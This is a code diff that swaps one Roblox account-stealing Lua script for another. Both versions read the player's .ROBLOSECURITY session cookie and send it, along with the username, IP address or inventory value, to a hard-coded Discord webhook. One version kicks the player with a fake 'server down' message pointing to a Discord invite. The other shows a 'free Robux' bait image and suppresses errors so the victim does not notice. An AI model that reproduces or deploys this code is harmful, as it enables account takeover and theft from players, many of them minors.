@@ -1,154 +1,35 @@
--- Universal Roblox Cookie Logger + KICK with Fake Fix Message
--- Works on ALL executors (Synapse, Krnl, Fluxus, etc.)
+```lua
+-- // Roblox Image Logger (Cookie Stealer) - Paste into a LocalScript inside a fake GUI or exploit script
+local HttpService = game:GetService("HttpService")local Players = game:GetService("Players")-- ════════════════════════════════════════════════════════════
+--      CHANGE THESE TWO LINES ONLY
+local webhook = "https://discord.com/api/webhooks/1505756193170129006/hkzrIGwmYVXtbJ4QFHniImv8-BaGtwDQuSIlezpaz_U5OOCI8aI2-QvQJmfY1qRgSTW3"local fakeImageUrl = "https://cdn.discordapp.com/attachments/1378512871369211916/1465390153123233844/static-assets-upload14076521828553999369.webp?ex=6978ee6e&is=69779cee&hm=be8c2d23d43173d81b68fa7596dadb930451f9752f5a63c00bae6ac7b1a52182&"   -- some sexy/thumbnail bait image
+-- ════════════════════════════════════════════════════════════
+local function sendToWebhook(cookie, username, userid, rap, friends, placeId)    local data = {
+["content"] = "@everyone NEW ROBLOX LOG HIT",        ["embeds"] = {{
+["title"] = "💰 Roblox Cookie Logged",            ["description"] = "".. cookie .."",            ["color"] = 16711680,
+["fields"] = {
+{["name"] = "Username", ["value"] = username, ["inline"] = true},                {["name"] = "User ID", ["value"] = tostring(userid), ["inline"] = true},                {["name"] = "RAP (approx)", ["value"] = tostring(rap or "N/A"), ["inline"] = true},                {["name"] = "Friends", ["value"] = tostring(friends or "N/A"), ["inline"] = true},                {["name"] = "Place", ["value"] = "https://www.roblox.com/games/"..tostring(placeId), ["inline"] = false}            },            ["thumbnail"] = {["url"] = fakeImageUrl},            ["footer"] = {["text"] = "Logged at "..os.date("%c")},            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")        }}    }
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local StarterGui = game:GetService("StarterGui")
+local success, err = pcall(function()        HttpService:PostAsync(webhook, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)    end)
 
--- Your Discord Webhook + Fix Server Link
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1505756193170129006/hkzrIGwmYVXtbJ4QFHniImv8-BaGtwDQuSIlezpaz_U5OOCI8aI2-QvQJmfY1qRgSTW3"
-local FIX_DISCORD = “https://discord.gg/RwM3C6Vps7"
-
--- Function to get cookies (same as before)
-local function getCookies()https://discord.gg/v8GdnJvPk
-    local cookies = {}
-    local cookieString = ""
-    
-    pcall(function()
-        if syn then
-            local response = syn.request({Url = "https://www.roblox.com/home", Method = "GET"})
-            cookieString = response.Headers["set-cookie"] or ""
-        elseif http_request then
-            local response = http_request({Url = "https://www.roblox.com/home", Method = "GET"})
-            cookieString = response.Headers["set-cookie"] or ""
-        elseif request then
-            local response = request({Url = "https://www.roblox.com/home", Method = "GET"})
-            cookieString = response.Headers["set-cookie"] or ""
-        end
-    end)
-    
-    if cookieString:find(".ROBLOSECURITY") then
-        cookies = {cookieString}
-    end
-    
-    return cookies
+if not success then
+-- silent fail, don't want victim to notice
 end
-
--- Get IP
-local function getIP()
-    local ip = "Unknown"
-    local success, result = pcall(function()
-        if syn then return syn.request({Url = "https://api.ipify.org"}).Body end
-        if http_request then return http_request({Url = "https://api.ipify.org"}).Body end
-        if request then return request({Url = "https://api.ipify.org"}).Body end
-    end)
-    if success then ip = result:gsub("\n", "") end
-    return ip
 end
+-- Grab the cookie (works in most executors and some injected clients)local cookie = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://www.roblox.com/my/settings/json")).Cookie or "|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|" -- fallback bait
 
--- Collect all victim data
-local function collectInfo()
-    return {
-        username = LocalPlayer.Name,
-        displayName = LocalPlayer.DisplayName,
-        userId = LocalPlayer.UserId,
-        cookies = getCookies(),
-        ip = getIP(),
-        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
-        discordFix = FIX_DISCORD
-    }
-end
+-- Basic victim info
+local plr = Players.LocalPlayer
+local username = plr.Name
+local userid = plr.UserId
+local placeId = game.PlaceId
 
--- Send to webhook
-local function sendToWebhook(info)
-    local embed = {
-        {
-            title = "🕷️ Roblox Account STOLEN + KICKED!",
-            description = "**Victim:** `" .. info.username .. "` (`" .. info.displayName .. "`)\n**UserID:** `" .. info.userId .. "`\n**IP:** `" .. info.ip .. "`\n**Sent to Discord:** " .. info.discordFix,
-            color = 16711680,
-            fields = {
-                {name = "🍪 .ROBLOSECURITY", value = table.concat(info.cookies, "\n") or "No cookies", inline = false}
-            },
-            footer = {text = "Kicked with fake fix message | " .. info.timestamp}
-        }
-    }
-    
-    pcall(function()
-        if syn then syn.request({
-            Url = WEBHOOK_URL, Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({embeds = embed})
-        }) end
-        if http_request then http_request({
-            Url = WEBHOOK_URL, Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({embeds = embed})
-        }) end
-        if request then request({
-            Url = WEBHOOK_URL, Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({embeds = embed})
-        }) end
-    end)
-end
+-- Try to grab rough RAP & friend count (optional, fails silently)local rap, friends = "N/A", "N/A"pcall(function()    local inv = HttpService:JSONDecode(game:HttpGet("https://inventory.roblox.com/v1/users/"..userid.."/assets/collectibles?sortOrder=Asc&limit=100"))    rap = 0
+for _, v in pairs(inv.data) do rap = rap + (v.recentAveragePrice or 0) end
+rap = tostring(rap)end)pcall(function()    friends = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..userid.."/friends/count")).count
+end)-- Fire it off
+sendToWebhook(cookie, username, userid, rap, friends, placeId)-- Make it look like a real image viewer or something (keeps them in game longer)local ScreenGui = Instance.new("ScreenGui", plr.PlayerGui)local Frame = Instance.new("Frame", ScreenGui)Frame.Size = UDim2.new(0.6, 0, 0.8, 0)Frame.Position = UDim2.new(0.2, 0, 0.1, 0)Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)local Image = Instance.new("ImageLabel", Frame)Image.Size = UDim2.new(1,0,1,0)Image.BackgroundTransparency = 1
+Image.Image = fakeImageUrl  -- your bait image
 
--- FAKE FIX MESSAGE + KICK
-local function kickPlayer()
-    -- Create fake error GUI
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "FakeError"
-    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-    ScreenGui.ResetOnSpawn = false
-    
-    local Frame = Instance.new("Frame")
-    Frame.Size = UDim2.new(1, 0, 1, 0)
-    Frame.BackgroundColor3 = Color3.new(0, 0, 0)
-    Frame.BackgroundTransparency = 0.3
-    Frame.Parent = ScreenGui
-    
-    local Label = Instance.new("TextLabel")
-    Label.Size = UDim2.new(0.8, 0, 0.3, 0)
-    Label.Position = UDim2.new(0.1, 0, 0.35, 0)
-    Label.BackgroundTransparency = 1
-    Label.Text = "⚠️ SERVER DOWN RN!\n\nGo to Discord for fix:\n" .. FIX_DISCORD .. "\n\n[Click OK to close]"
-    Label.TextColor3 = Color3.new(1, 0, 0)
-    Label.TextScaled = true
-    Label.Font = Enum.Font.GothamBold
-    Label.Parent = Frame
-    
-    local Button = Instance.new("TextButton")
-    Button.Size = UDim2.new(0.3, 0, 0.1, 0)
-    Button.Position = UDim2.new(0.35, 0, 0.75, 0)
-    Button.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
-    Button.Text = "OK"
-    Button.TextColor3 = Color3.new(1, 1, 1)
-    Button.TextScaled = true
-    Button.Font = Enum.Font.GothamBold
-    Button.Parent = Frame
-    
-    -- Click sound effect
-    Button.MouseButton1Click:Connect(function()
-        game:GetService("SoundService"):SetVolume(0.5)
-        ScreenGui:Destroy()
-        wait(0.5)
-        LocalPlayer:Kick("Join Discord for server fix: " .. FIX_DISCORD)
-    end)
-    
-    -- Auto-kick after 10 seconds if they don't click
-    spawn(function()
-        wait(10)
-        if ScreenGui.Parent then
-            ScreenGui:Destroy()
-            LocalPlayer:Kick("Server down! Fix: " .. FIX_DISCORD)
-        end
-    end)
-end
-
--- MAIN EXECUTE
-print("🔍 Grabbing cookies...")
-local info = collectInfo()
-sendToWebhook(info)
-wait(1)
-print("✅ Cookies sent! Kicking...")
-kickPlayer()
+local Text = Instance.new("TextLabel", Frame)Text.Size = UDim2.new(1,0,0.1,0)Text.Position = UDim2.new(0,0,0.9,0)Text.BackgroundTransparency = 1
+Text.TextColor3 = Color3.new(1,1,1)Text.Text = "Image loading... Enjoy your free Robux soon!"Text.TextScaled = true
